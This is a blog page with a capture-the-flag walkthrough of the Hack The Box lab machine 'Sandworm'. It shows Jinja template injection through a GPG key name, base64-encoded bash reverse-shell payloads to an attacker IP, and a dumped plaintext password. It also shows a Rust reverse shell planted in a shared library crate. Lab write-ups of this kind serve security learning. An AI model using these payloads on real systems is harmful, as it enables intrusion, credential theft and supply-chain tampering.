<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self' https://www.dropbox.com https://*.dl.dropboxusercontent.com https://photos.app.goo.gl https://drive.google.com https://photos.google.com https://video-downloads.googleusercontent.com https://*.googleusercontent.com https://*.googlevideo.com https://youtube.googleapis.com; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self' https://w.soundcloud.com https://www.youtube.com https://www.youtube-nocookie.com https://www.dropbox.com http://localhost https://www.dropbox.com http://darvein.local https://disqus.com; img-src 'self' https://photos.google.com https://lh3.googleusercontent.com https://www.dropbox.com https://*.dl.dropboxusercontent.com https://*.disqus.com https://c.disquscdn.com; object-src https://lh3.googleusercontent.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/ https://c.disquscdn.com; script-src 'self' 'unsafe-inline' https://www.google-analytics.com https://cdnjs.cloudflare.com https://www.googletagmanager.com https://www.dropbox.com http://localhost http://darvein.local https://drv21.disqus.com https://c.disquscdn.com; prefetch-src 'self' https://youtube.googleapis.com; connect-src 'self' https://www.google-analytics.com https://links.services.disqus.com;"><meta name=author content="Dennis Ruiz"><meta name=description content="medium - Sandworm User Flag Ok, let&rsquo;s start, the machine has a vhost listening to ssa.htb
z➤ curl -L sandworm.htb curl: (6) Could not resolve host: ssa.htb We can just see a simple web page:
~z➤ curl -s -L -k ssa.htb | elinks --dump [1]Secret Spy Agency • [2]Home • [3]About • [4]Contact Our Mission We leverage our advantages in technology and cybersecurity consistent with our authorities to strengthen national defense and secure national security systems."><meta name=keywords content="blog,developer,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content><meta name=twitter:description content="medium - Sandworm User Flag Ok, let&rsquo;s start, the machine has a vhost listening to ssa.htb
z➤ curl -L sandworm.htb curl: (6) Could not resolve host: ssa.htb We can just see a simple web page:
~z➤ curl -s -L -k ssa.htb | elinks --dump [1]Secret Spy Agency • [2]Home • [3]About • [4]Contact Our Mission We leverage our advantages in technology and cybersecurity consistent with our authorities to strengthen national defense and secure national security systems."><meta property="og:title" content><meta property="og:description" content="medium - Sandworm User Flag Ok, let&rsquo;s start, the machine has a vhost listening to ssa.htb
z➤ curl -L sandworm.htb curl: (6) Could not resolve host: ssa.htb We can just see a simple web page:
~z➤ curl -s -L -k ssa.htb | elinks --dump [1]Secret Spy Agency • [2]Home • [3]About • [4]Contact Our Mission We leverage our advantages in technology and cybersecurity consistent with our authorities to strengthen national defense and secure national security systems."><meta property="og:type" content="article"><meta property="og:url" content="https://www.darvein.net/infosec/htb/machines/medium/sandworm/"><meta property="article:section" content="infosec"><title>medium - Sandworm </title><link rel=canonical href=https://www.darvein.net/infosec/htb/machines/medium/sandworm/><link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.a1a7e7e7bd8b6629931805334fd6cf056ee6f154702847e6d597bbfe80446a0d.css integrity="sha256-oafn572LZimTGAUzT9bPBW7m8VRwKEfm1Ze7/oBEag0=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.39e41a7f16bdf8cb16e43cae7d714fa1016f1d2d2898a5b3f27f42c9979204e2.css integrity="sha256-OeQafxa9+MsW5DyufXFPoQFvHS0omKWz8n9CyZeSBOI=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/custom.min.7cf8a329bb485491ed5be45bd286916c655bf66e11e3fe4d82649437eae8b51b.css integrity="sha256-fPijKbtIVJHtW+Rb0oaRbGVb9m4R4/5NgmSUN+rotRs=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5><meta name=generator content="Hugo 0.120.4"></head><body class="preload-transitions colorscheme-dark"><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/>Darvein
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/infosec/>Infosec</a></li><li class=navigation-item><a class=navigation-link href=/coding/>Coding</a></li><li class=navigation-item><a class=navigation-link href=/devops/>Devops</a></li></ul></section></nav><div class=content><section class="container page"><article><h1 id=medium---sandworm>medium - Sandworm
<a class=heading-link href=#medium---sandworm><i class="fa fa-link" aria-hidden=true></i></a></h1><h2 id=user-flag>User Flag
<a class=heading-link href=#user-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>Ok, let&rsquo;s start, the machine has a vhost listening to ssa.htb</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ curl -L sandworm.htb
</span></span><span style=display:flex><span>curl: (6) Could not resolve host: ssa.htb
</span></span></code></pre></div><p>We can just see a simple web page:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl -s -L -k ssa.htb | elinks --dump
</span></span><span style=display:flex><span>   [1]Secret Spy Agency
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     • [2]Home
</span></span><span style=display:flex><span>     • [3]About
</span></span><span style=display:flex><span>     • [4]Contact
</span></span><span style=display:flex><span>                                  Our Mission
</span></span><span style=display:flex><span>   We leverage our advantages in technology and cybersecurity consistent with
</span></span><span style=display:flex><span>   our authorities to strengthen national defense and secure national
</span></span><span style=display:flex><span>   security systems.
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>By looking source of the pages I&rsquo;ve found this tool:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~z➤ curl -s -L -k ssa.htb/contact  | ag href
</span></span><span style=display:flex><span>        &lt;link <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;icon&#34;</span> <span style=color:#fb660a>type</span>=<span style=color:#0086d2>&#34;image/x-icon&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/static/favicon.ico&#34;</span>/&gt;
</span></span><span style=display:flex><span>        &lt;link <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;stylesheet&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/static/bootstrap-icons2.css&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;link <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/static/bootstrap-icons.css&#34;</span> <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;stylesheet&#34;</span> /&gt;
</span></span><span style=display:flex><span>        &lt;link <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/static/styles.css&#34;</span> <span style=color:#fb660a>rel</span>=<span style=color:#0086d2>&#34;stylesheet&#34;</span> /&gt;
</span></span><span style=display:flex><span>                &lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;navbar-brand&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/&#34;</span>&gt;Secret Spy Agency&lt;/a&gt;
</span></span><span style=display:flex><span>                            &lt;li <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-item&#34;</span>&gt;&lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link&#34;</span> aria-current=<span style=color:#0086d2>&#34;page&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/&#34;</span>&gt;Home&lt;/a&gt;&lt;/li&gt;
</span></span><span style=display:flex><span>                            &lt;li <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-item&#34;</span>&gt;&lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/about&#34;</span>&gt;About&lt;/a&gt;&lt;/li&gt;
</span></span><span style=display:flex><span>                        &lt;li <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-item&#34;</span>&gt;&lt;a <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;nav-link active&#34;</span> <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;#!&#34;</span>&gt;Contact&lt;/a&gt;&lt;/li&gt;
</span></span><span style=display:flex><span>                          &lt;p&gt;Don&#39;t know how to use PGP? Check out our &lt;a <span style=color:#fb660a>href</span>=<span style=color:#0086d2>&#34;/guide&#34;</span> <span style=color:#fb660a>class</span>=<span style=color:#0086d2>&#34;key&#34;</span>&gt;guide&lt;/a&gt;&lt;/p&gt;
</span></span></code></pre></div><figure class=image-container><a href=/i/2023-08-08_10-21.png><img width=100% src=/i/2023-08-08_10-21.png alt="PGP tool"></a><figcaption>&#8213; PGP tool &#8213;</figcaption></figure><p>Basically we have to send only encrypted text on page <code>/contact</code> using their PGP demo tool.</p><p>I also know that, the site is using Flask (?):</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#fb660a;font-weight:700>p</span> <span style=color:#ff0086;font-weight:700>class</span>=<span style=color:#0086d2>&#34;m-0 text-center text-white opacity-100 fst-italic&#34;</span>&gt;Powered by Flask&amp;trade; &lt;/<span style=color:#fb660a;font-weight:700>p</span>&gt;
</span></span></code></pre></div><p>So, it all leads that there might be a CLI way to validate those PGP Signatures, also, given I saw it is using Flask so Jinja should be the Templating system.</p><p>Let&rsquo;s generate something that cannot be escaped properly by Jinja, instead processed/evaluted. Let&rsquo;s use the <code>name</code> field of a GPG UID.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>gpg --gen-key   <span style=color:#080;background-color:#0f140f;font-style:italic># Generating PGP Key</span>
</span></span><span style=display:flex><span>gpg --edit-key XXXXXXXXX    <span style=color:#080;background-color:#0f140f;font-style:italic># Edit the generated PGP Key</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;background-color:#0f140f;font-style:italic># Let&#39;s add a UID</span>
</span></span><span style=display:flex><span>gpg&gt; adduid
</span></span><span style=display:flex><span>Real name: {{9*9}}
</span></span><span style=display:flex><span>Email address: foo@bar.com
</span></span><span style=display:flex><span>Comment:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gpg&gt; trust
</span></span><span style=display:flex><span>gpg&gt; save
</span></span></code></pre></div><p>Ok, now let&rsquo;s export the public PGP key and generate a dummy text so we can validate the signature in
<a href=https://ssa.htb/guide/encrypt>https://ssa.htb/guide/encrypt</a></p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>gpg --armor --export <span style=color:#0086d2>&#39;lol&#39;</span> &gt; pub.asc
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>z➤ echo <span style=color:#0086d2>&#39;test&#39;</span> | gpg --clear-sign
</span></span><span style=display:flex><span>-----BEGIN PGP SIGNED MESSAGE-----
</span></span><span style=display:flex><span>Hash: SHA256
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>test
</span></span><span style=display:flex><span>-----BEGIN PGP SIGNATURE-----
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>iQGzBAEBCAAdFiEElEYdb9ECXVfTY/cqwGZaQgS3h8EFAmTVedwACgkQwGZaQgS3
</span></span><span style=display:flex><span>h8F42gv/cp9Rwmj3nr/EAe6R0B+4tEHPKNEZHl3xQHLd1nfiyPzgSODQpzwROzQW
</span></span><span style=display:flex><span>B9grdnKC0Lz91zmQL6sy+UNg1cflqBgcDtE/vj0KdewoGSa3s0NmowilyBII5ebJ
</span></span><span style=display:flex><span>GBIPH8sOrlBUQE6CyS8uTdXADi81dAe7U6gVZI+4Z6D2s6Ni7A+MK24B1MdMAxS/
</span></span><span style=display:flex><span>BsN0Wec5tZPe0xMrlJkcYKvpqB7NYJv+NfZaGPQ5lslvG4/wkbkl8gXerlUXtuw/
</span></span><span style=display:flex><span>bIhJAG6IIR6/8PPi9/1fuxsg3XBdaSncaRzv+kL+jNu3WpqLYO0mI62Sl7bibWGk
</span></span><span style=display:flex><span>EOLWMOlMd/onAabLKC38aSYZHtwTwsJkpAvJSZULOqgonfMx1e7hLd2ZE+4qdQhU
</span></span><span style=display:flex><span>gVnlE0xPotolcUtK43504EltXuQGn+nJ4uWm3x9fNmxrnJVvYVK8WEH/9mt936cH
</span></span><span style=display:flex><span>a2bnrb9UsNy7Oj5BSZDYDC6LUK1dxneIvxKeZ6g49LqvyGYeojdbV+Vn0INufbNW
</span></span><span style=display:flex><span>c+kyZk+6
</span></span><span style=display:flex><span>=CibY
</span></span><span style=display:flex><span>-----END PGP SIGNATURE-----
</span></span></code></pre></div><p>And voilá, the <code>9*9</code> has been processed and evaluted, I tested other examples as well, you can see the screenshot:<figure class=image-container><a href=/i/2023-08-10_19-53.png><img width=100% src=/i/2023-08-10_19-53.png alt="Server Side Templating Injection"></a><figcaption>&#8213; Server Side Templating Injection &#8213;</figcaption></figure></p><h3 id=rev-shell-access>Rev Shell access
<a class=heading-link href=#rev-shell-access><i class="fa fa-link" aria-hidden=true></i></a></h3><p>Ok, so we just need to get a reverse shell with the SSTI vuln. Thanks to PayloadAllTheThings:
<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread</a></p><p>First, let&rsquo;s get a bash revshell:<figure class=image-container><a href=/i/2023-08-10_20-05.png><img width=100% src=/i/2023-08-10_20-05.png alt=revshell></a><figcaption>&#8213; revshell &#8213;</figcaption></figure></p><p>Second, let&rsquo;s build or payload so we can exploit Jinja via <code>gpg</code>:
<code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzU1NTU1IDA+JjE= | base64 -d | bash" ').read() }}</code></p><p>Third, now we add a new <code>uid</code> into our PGP Key, we export the pub key, we generate a dummy signed text and we try to validate the Signature.</p><p><figure class=image-container><a href=/i/2023-08-10_20-09.png><img width=100% src=/i/2023-08-10_20-09.png alt=Injection></a><figcaption>&#8213; Injection &#8213;</figcaption></figure><figure class=image-container><a href=/i/2023-08-10_20-10.png><img width=100% src=/i/2023-08-10_20-10.png alt=Injection></a><figcaption>&#8213; Injection &#8213;</figcaption></figure></p><p>You will notice the page will hang, that means we&rsquo;ve got it:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ nc -lvnp <span style=color:#0086f7;font-weight:700>55555</span>
</span></span><span style=display:flex><span>Connection from 10.10.11.218:60890
</span></span><span style=display:flex><span>bash: cannot set terminal process group (-1): Inappropriate ioctl <span style=color:#fb660a;font-weight:700>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>/usr/local/sbin/lesspipe: 1: dirname: not found
</span></span><span style=display:flex><span>atlas@sandworm:/var/www/html/SSA$ id
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(atlas) <span style=color:#fb660a>gid</span>=1000(atlas) <span style=color:#fb660a>groups</span>=1000(atlas)
</span></span><span style=display:flex><span>atlas@sandworm:/var/www/html/SSA$
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>atlas@sandworm:/var/www/html/SSA$ cat /etc/passwd
</span></span><span style=display:flex><span>cat /etc/passwd
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style=display:flex><span>silentobserver:x:1001:1001::/home/silentobserver:/bin/bash
</span></span><span style=display:flex><span>atlas:x:1000:1000::/home/atlas:/bin/bash
</span></span></code></pre></div><p>This user didn&rsquo;t have the flag, I was not even able to use <code>find</code> commmand, I got &ldquo;Command not found&rdquo; all the time. This <code>atlas</code> user had this file with credentials for the user we saw in the <code>/etc/passwd</code> file, <code>silentobserver</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>atlas@sandworm:~$ cat .config/httpie/sessions/localhost_5000/admin.json
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cat .config/httpie/sessions/localhost_5000/admin.json
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;__meta__&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#0086d2>&#34;about&#34;</span>: <span style=color:#0086d2>&#34;HTTPie session file&#34;</span>,
</span></span><span style=display:flex><span>        ...
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;auth&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#0086d2>&#34;password&#34;</span>: <span style=color:#0086d2>&#34;quietLiketheWind22&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#0086d2>&#34;type&#34;</span>: null,
</span></span><span style=display:flex><span>        <span style=color:#0086d2>&#34;username&#34;</span>: <span style=color:#0086d2>&#34;silentobserver&#34;</span>
</span></span><span style=display:flex><span>    },
</span></span><span style=display:flex><span>    <span style=color:#0086d2>&#34;cookies&#34;</span>: {
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>SSHing:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>~➤ ssh silentobserver@ssa.htb
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>Last login: Mon Jun <span style=color:#0086f7;font-weight:700>12</span> 12:03:09 <span style=color:#0086f7;font-weight:700>2023</span> from 10.10.14.31
</span></span><span style=display:flex><span>silentobserver@sandworm:~$ ls
</span></span><span style=display:flex><span>user.txt
</span></span><span style=display:flex><span>silentobserver@sandworm:~$ id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1001(silentobserver) <span style=color:#fb660a>gid</span>=1001(silentobserver) <span style=color:#fb660a>groups</span>=1001(silentobserver)
</span></span></code></pre></div><h2 id=root-flag>Root Flag
<a class=heading-link href=#root-flag><i class="fa fa-link" aria-hidden=true></i></a></h2><p>This user doesn&rsquo;t have <code>sudo</code>, but I&rsquo;ve found something interesting, some .git repos.</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>silentobserver@sandworm:~$ sudo -l
</span></span><span style=display:flex><span>[sudo] password <span style=color:#fb660a;font-weight:700>for</span> silentobserver:
</span></span><span style=display:flex><span>Sorry, user silentobserver may not run sudo on localhost.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>silentobserver@sandworm:~$ find / -type d -name .git 2&gt;/dev/null
</span></span><span style=display:flex><span>/opt/tipnet/.git
</span></span><span style=display:flex><span>/opt/crates/logger/.git
</span></span><span style=display:flex><span>/home/silentobserver/.cargo/registry/index/github.com-1ecc6299db9ec823/.git
</span></span><span style=display:flex><span>/home/atlas/.cargo/registry/index/github.com-1ecc6299db9ec823/.git
</span></span></code></pre></div><p><code>/opt/tipnet</code> Doesn&rsquo;t seem to be helpful:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>silentobserver@sandworm:/opt/tipnet$ find . -type f 2&gt;/dev/null | egrep -v <span style=color:#0086d2>&#39;debug&#39;</span> | xargs -I{} ls -ltra {}
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#0086f7;font-weight:700>1</span> root atlas <span style=color:#0086f7;font-weight:700>288</span> May  <span style=color:#0086f7;font-weight:700>4</span> 15:50 ./Cargo.toml
</span></span><span style=display:flex><span>ls: cannot access <span style=color:#0086d2>&#39;./.git/config&#39;</span>: Permission denied
</span></span><span style=display:flex><span>ls: cannot access <span style=color:#0086d2>&#39;./.git/description&#39;</span>: Permission denied
</span></span><span style=display:flex><span>ls: cannot access <span style=color:#0086d2>&#39;./.git/HEAD&#39;</span>: Permission denied
</span></span><span style=display:flex><span>-rwxr-xr-- <span style=color:#0086f7;font-weight:700>1</span> root atlas <span style=color:#0086f7;font-weight:700>8</span> Feb  <span style=color:#0086f7;font-weight:700>8</span>  <span style=color:#0086f7;font-weight:700>2023</span> ./.gitignore
</span></span><span style=display:flex><span>-rwxr-xr-- <span style=color:#0086f7;font-weight:700>1</span> root atlas <span style=color:#0086f7;font-weight:700>177</span> Feb  <span style=color:#0086f7;font-weight:700>8</span>  <span style=color:#0086f7;font-weight:700>2023</span> ./target/CACHEDIR.TAG
</span></span><span style=display:flex><span>-rwxr-xr-- <span style=color:#0086f7;font-weight:700>1</span> root atlas <span style=color:#0086f7;font-weight:700>1035</span> Feb  <span style=color:#0086f7;font-weight:700>8</span>  <span style=color:#0086f7;font-weight:700>2023</span> ./target/.rustc_info.json
</span></span><span style=display:flex><span>-rwxr-xr-- <span style=color:#0086f7;font-weight:700>1</span> root atlas <span style=color:#0086f7;font-weight:700>5795</span> May  <span style=color:#0086f7;font-weight:700>4</span> 16:55 ./src/main.rs
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#0086f7;font-weight:700>1</span> root atlas <span style=color:#0086f7;font-weight:700>46161</span> May  <span style=color:#0086f7;font-weight:700>4</span> 16:38 ./Cargo.lock
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#0086f7;font-weight:700>1</span> atlas atlas <span style=color:#0086f7;font-weight:700>25062</span> Aug <span style=color:#0086f7;font-weight:700>11</span> 00:28 ./access.log
</span></span></code></pre></div><p><code>/opt/crates/logger</code> has files owned by <code>atlas</code> but also owned by group <code>silentobserver</code>, plus, some writeable files:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>silentobserver@sandworm:/opt/crates/logger$ find . -type f 2&gt;/dev/null | egrep -v <span style=color:#0086d2>&#39;debug|.git&#39;</span> | xargs -I{} ls -ltra {}
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#0086f7;font-weight:700>1</span> atlas silentobserver <span style=color:#0086f7;font-weight:700>190</span> May  <span style=color:#0086f7;font-weight:700>4</span> 17:08 ./Cargo.toml
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#0086f7;font-weight:700>1</span> atlas silentobserver <span style=color:#0086f7;font-weight:700>177</span> May  <span style=color:#0086f7;font-weight:700>4</span> 17:08 ./target/CACHEDIR.TAG
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#0086f7;font-weight:700>1</span> atlas silentobserver <span style=color:#0086f7;font-weight:700>1035</span> May  <span style=color:#0086f7;font-weight:700>4</span> 17:08 ./target/.rustc_info.json
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#0086f7;font-weight:700>1</span> atlas silentobserver <span style=color:#0086f7;font-weight:700>732</span> May  <span style=color:#0086f7;font-weight:700>4</span> 17:12 ./src/lib.rs
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#0086f7;font-weight:700>1</span> atlas silentobserver <span style=color:#0086f7;font-weight:700>11644</span> May  <span style=color:#0086f7;font-weight:700>4</span> 17:11 ./Cargo.lock
</span></span></code></pre></div><p>So let&rsquo;s see what is we have ownership as group and is writeable:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>silentobserver@sandworm:/opt/crates/logger$ cd /opt/crates/logger; <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>     find . -group <span style=color:#fb660a;font-weight:700>$(</span>id -g<span style=color:#fb660a;font-weight:700>)</span> -perm -g=w -type f 2&gt;/dev/null <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>     | egrep -v <span style=color:#0086d2>&#39;target|.git&#39;</span> <span style=color:#0086d2>\
</span></span></span><span style=display:flex><span><span style=color:#0086d2></span>     | xargs -I{} ls -ltra {}
</span></span><span style=display:flex><span>-rw-rw-r-- <span style=color:#0086f7;font-weight:700>1</span> atlas silentobserver <span style=color:#0086f7;font-weight:700>732</span> May  <span style=color:#0086f7;font-weight:700>4</span> 17:12 ./src/lib.rs
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>silentobserver@sandworm:/opt/crates/logger$ cat /opt/crates/logger/src/lib.rs
</span></span><span style=display:flex><span>extern crate chrono;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>use std::fs::OpenOptions;
</span></span><span style=display:flex><span>use std::io::Write;
</span></span><span style=display:flex><span>use chrono::prelude::*;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pub fn log(user: &amp;str, query: &amp;str, justification: &amp;str) {
</span></span><span style=display:flex><span>    let <span style=color:#fb660a>now</span> = Local::now();
</span></span><span style=display:flex><span>    let <span style=color:#fb660a>timestamp</span> = now.format(<span style=color:#0086d2>&#34;%Y-%m-%d %H:%M:%S&#34;</span>).to_string();
</span></span><span style=display:flex><span>    let <span style=color:#fb660a>log_message</span> = format!(<span style=color:#0086d2>&#34;[{}] - User: {}, Query: {}, Justification: {}\n&#34;</span>, timestamp, user, query, justification);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    let mut <span style=color:#fb660a>file</span> = match OpenOptions::new().append(true).create(true).open(<span style=color:#0086d2>&#34;/opt/tipnet/access.log&#34;</span>) {
</span></span><span style=display:flex><span>        Ok(file) =&gt; file,
</span></span><span style=display:flex><span>        Err(e) =&gt; {
</span></span><span style=display:flex><span>            println!(<span style=color:#0086d2>&#34;Error opening log file: {}&#34;</span>, e);
</span></span><span style=display:flex><span>            <span style=color:#fb660a;font-weight:700>return</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#fb660a;font-weight:700>if</span> let Err(e) = file.write_all(log_message.as_bytes()) {
</span></span><span style=display:flex><span>        println!(<span style=color:#0086d2>&#34;Error writing to log file: {}&#34;</span>, e);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Ok, this <code>logger</code> component is used by <code>tipnet</code> app, if we can modify this <code>./src/lib.rs</code> file then we can get it to execute anything by <code>atlas</code> user. So first let&rsquo;s open a reverse shell from Rust, let&rsquo;s add this code in the lib.rs file, right after the function <code>pub fn log(){.....</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-rust data-lang=rust><span style=display:flex><span><span style=color:#fb660a;font-weight:700>use</span><span style=color:#888> </span>std::process::Command;<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>  </span>Command::new(<span style=color:#0086d2>&#34;bash&#34;</span>)<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>          </span>.arg(<span style=color:#0086d2>&#34;-c&#34;</span>)<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>          </span>.arg(<span style=color:#0086d2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.7/55555 0&gt;&amp;1&#34;</span>)<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>          </span>.output()<span style=color:#888>
</span></span></span><span style=display:flex><span><span style=color:#888>          </span>.expect(<span style=color:#0086d2>&#34;failed to execute process&#34;</span>);<span style=color:#888>
</span></span></span></code></pre></div><p>Then let&rsquo;s build it: <code>cd /opt/crates/logger/src; cargo build</code><figure class=image-container><a href=/i/2023-08-10_20-51.png><img width=100% src=/i/2023-08-10_20-51.png alt="building logger"></a><figcaption>&#8213; building logger &#8213;</figcaption></figure></p><p>And now we&rsquo;ve got a revshell :evil:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#111;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>z➤ nc -lvnp <span style=color:#0086f7;font-weight:700>55555</span>
</span></span><span style=display:flex><span>Connection from 10.10.11.218:37238
</span></span><span style=display:flex><span>bash: cannot set terminal process group (3802): Inappropriate ioctl <span style=color:#fb660a;font-weight:700>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>atlas@sandworm:/opt/tipnet$ id
</span></span><span style=display:flex><span>id
